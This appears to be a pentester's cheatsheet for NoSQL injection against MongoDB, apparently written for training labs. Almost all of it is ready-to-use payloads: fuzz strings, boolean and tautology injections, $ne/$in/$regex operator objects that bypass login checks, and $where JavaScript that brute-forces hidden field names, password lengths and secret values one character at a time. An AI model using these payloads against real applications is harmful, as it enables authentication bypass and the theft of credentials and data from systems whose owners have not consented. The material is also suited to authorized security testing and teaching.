# MongoDB NoSQL Injection (NoSQLi) Cheatsheet

> **Target:** MongoDB | **Type:** Syntax Injection & Operator Injection

---

## Quick Reference

| Phase | Technique | Goal |
|---|---|---|
| Detect | Universal fuzz string | Trigger syntax errors |
| Detect | Boolean conditions (`&& 0`, `&& 1`) | Confirm injection point |
| Detect | Null byte (`%00`) | Bypass trailing conditions |
| Operator Injection | `$ne`, `$in`, `$regex` | Auth bypass / data enumeration |
| Operator Injection | `$where` | JavaScript expression evaluation |
| Data Extraction | `this.password.length` | Determine field value length |
| Data Extraction | `this.password[0] == 'a'` | Brute-force field content char-by-char |
| Data Extraction | `Object.keys(this)[n]` | Enumerate hidden field names |
| Exfiltration | `$regex: "^a.*"` | Leak field content via regex matching |

---

## 1. Detection

### 1.1 Universal Fuzz String
Inject this string to probe for syntax errors or unexpected behavior. A malformed response or server error indicates a potential injection point.

```
'"`{;$Foo}$Foo \xYZ
```

URL-encoded form:
```
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

### 1.2 Syntax Confirmation (String Injection)
Test whether the input is embedded in a string context. A broken response on the first payload and a normal one on the second confirms injectable string concatenation.

```http
# Breaks the query — expect error or anomaly
GET /user/lookup?user=wiener'

# Repairs the query — expect normal response
GET /user/lookup?user=wiener'+'

# Escaped quote — alternative repair test
GET /user/lookup?user=wiener'\''
```

### 1.3 Boolean Condition Testing
Inject boolean expressions to verify logic control. **False** should suppress results; **True** should return normal results.

```http
# False condition — should return no results
GET /product/lookup?category=fizzy'+%26%26+0+%26%26+'x
# Decoded: fizzy' && 0 && 'x

# True condition — should return normal results
GET /product/lookup?category=fizzy'+%26%26+1+%26%26+'x
# Decoded: fizzy' && 1 && 'x
```

### 1.4 Condition Override
Inject a tautology (`'1'=='1`) to make the query always return true — useful for bypassing filters or returning all records.

```http
GET /product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
# Decoded: fizzy'||'1'=='1
```

### 1.5 Null Byte Truncation
A null byte (`%00`) terminates the query string server-side, effectively ignoring any conditions appended after the injection point.

```http
GET /product/lookup?category=fizzy'%00
```

---

## 2. Operator Injection

Operator injection replaces a string value with a MongoDB query operator object in JSON body requests.

### 2.1 Useful Operators

| Operator | Description |
|---|---|
| `$ne` | Matches values **not equal** to the specified value |
| `$in` | Matches any value **in** the specified array |
| `$regex` | Matches values against a **regular expression** |
| `$where` | Evaluates a **JavaScript expression** against each document |

### 2.2 Payloads

Starting from a normal login request, escalate through operator injection:

```json
// Normal request
{"username": "wiener", "password": "peter"}

// Bypass password check — match any password that is not "invalid"
{"username": "wiener", "password": {"$ne": "invalid"}}

// Bypass both username and password checks
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}

// Target specific privileged usernames
{"username": {"$in": ["admin", "administrator", "superadmin"]}, "password": {"$ne": ""}}

// Match username with a regex pattern
{"username": {"$regex": "admin.*"}, "password": {"$ne": "invalid"}}
```

---

## 3. Data Extraction (Syntax Injection)

Used when input is injectable within a string context (e.g., `GET` parameters). Payloads leverage JavaScript-like logic to probe data field by field.

### 3.1 Confirm Injection Point
Verify that boolean conditions affect the response before extracting data.

```
# Returns data (true)
wiener' && '1'=='1

# Returns no data (false)
wiener' && '1'=='2
```

### 3.2 Determine Password Length
Binary-search the length by incrementing or using `==` until the response changes.

```
administrator' && this.password.length < 30 || 'a'=='b
administrator' && this.password.length == 10 || 'a'=='b
```

### 3.3 Brute-Force Password Character by Character
Iterate over each character index and test each possible character. A true response reveals the correct character.

```
# Test index 0 for character 'a'
administrator' && this.password[0] == 'a' || 'a'=='b

# Test index 0 for character 'b'
administrator' && this.password[0] == 'b' || 'a'=='b
```

### 3.4 Match Against Regex Patterns
Use regex to test for character classes (digits, letters, etc.) before brute-forcing.

```
# Check if password contains a digit
administrator' && this.password.match(/\d/) || 'a'=='b
```

### 3.5 Identify Field Names
Probe for the existence of fields by referencing them in conditions. A normal response means the field exists; an error or empty response means it doesn't.

```
# 'username' exists → normal response
administrator' && this.username!='

# 'foo' doesn't exist → error or anomaly
admin' && this.foo!='
```

---

## 4. Data Extraction via `$where` Operator Injection

Used when the application accepts JSON bodies and is vulnerable to operator injection. `$where` allows JavaScript execution server-side.

### 4.1 Confirm `$where` Injection

```json
// Baseline
{"username": "wiener", "password": "peter"}

// False — should change response
{"username": "wiener", "password": {"$ne": "asd"}, "$where": "0"}

// True — should return normal response
{"username": "wiener", "password": {"$ne": "asd"}, "$where": "1"}
```

### 4.2 Enumerate Field Names

**Step 1 — Get the length of a field name at index `[n]`:**
```json
{
  "username": "wiener",
  "password": {"$ne": "asd"},
  "$where": "Object.keys(this)[0].length == 6"
}
```

**Step 2 — Brute-force the field name character by character:**
```json
{
  "username": "carlos",
  "password": {"$ne": "asd"},
  "$where": "Object.keys(this)[0].match('^.{0}a.*')"
}
```
> `[0]` = field index, `{0}` = character position, `a` = character being tested.

### 4.3 Extract Field Content

**Get the length of a field's value:**
```json
{
  "username": "carlos",
  "password": {"$ne": "asd"},
  "$where": "this.secretField.length == 16"
}
```

**Brute-force the field's value character by character:**
```json
{
  "username": "carlos",
  "password": {"$ne": "asd"},
  "$where": "this.secretField.match('^.{0}a.*')"
}
```

---

## 5. Data Exfiltration via `$regex`

A simpler alternative to `$where` when JavaScript isn't available. Uses regex anchoring to leak a value prefix by prefix.

```json
// Baseline — matches any password
{"username": "admin", "password": {"$regex": "^.*"}}

// Test if password starts with 'a'
{"username": "admin", "password": {"$regex": "^a.*"}}

// Test if password starts with 'ab'
{"username": "admin", "password": {"$regex": "^ab.*"}}
```
> A successful login (or truthy response) confirms the prefix is correct. Iterate character by character to reconstruct the full value.
